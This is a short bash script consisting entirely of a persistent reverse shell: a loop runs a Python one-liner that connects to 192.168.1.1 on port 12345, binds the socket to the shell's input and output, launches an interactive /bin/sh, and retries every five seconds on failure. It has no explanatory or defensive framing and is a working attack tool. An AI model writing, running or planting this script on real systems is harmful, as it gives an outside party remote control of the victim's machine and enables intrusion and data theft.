#!/bin/bash

while true; do
    python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.1",12345));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' 
    if [ $? -eq 0 ]; then
        echo "Connected!"
    else
        echo "Reconnecting in 5 Second ..."
        sleep 5
    fi
done
